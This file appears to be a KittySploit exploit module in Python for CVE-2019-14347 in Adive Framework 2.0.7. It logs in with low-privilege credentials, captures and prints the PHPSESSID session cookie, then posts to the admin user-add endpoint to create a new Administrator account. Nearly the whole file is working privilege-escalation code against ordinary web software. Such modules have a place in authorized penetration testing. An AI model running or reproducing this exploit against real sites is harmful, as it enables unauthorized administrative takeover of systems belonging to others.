from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_login import Http_login

class Module(Auxiliary, Http_client, Http_login):


	__info__ = {
			'name': 'Adive Framework 2.0.7',
			'description': 'Internal/Views/addUsers.php in Schben Adive 2.0.7 allows remote '\
       						'unprivileged users (editor or developer) to create an administrator account via admin/user/add',
			'author': 'KittySploit Team',
			'cve': ['2019-14347'],
		}
	
	newuser = OptString("", "enter a valid password", True)
	newpassword = OptString("", "enter a valid password", True)
	permission = OptString("Administrator", "Administrator, Developer or Editor", True)
	
	def run(self):
		
		data = {
				"login":self.username,
				"password":self.password
				}
		login = self.http_request(
						method = "POST",
						path = "/adive/admin/login",
						data = data,
						session=True
						)
		if login.status_code == 200:
			self.login_success()
			cookie = self.session.cookies.get_dict()['PHPSESSID']
			print_success("Your session cookie is: {}".format(cookie))
			
			data = {
				'userName':self.newuser,
				'userUsername':self.newuser,
				'pass':self.newpassword,
				'cpass':self.newpassword,
				'permission':self.permission
			}
			
			headers= {
				'Cookie': 'PHPSESSID='+cookie
					}
			
			priv = self.http_request(
							method = "POST",
							path = "/adive/admin/user/add",
							data = data,
							headers = headers,
							session = True
							)
			
			if priv.status_code == 200:
				print_success("Account created")
				return True
			else:
				print_error("Failed to created account")
				fail.NotVulnerable()
				return False

		else:
			fail.LoginFailed()
			return False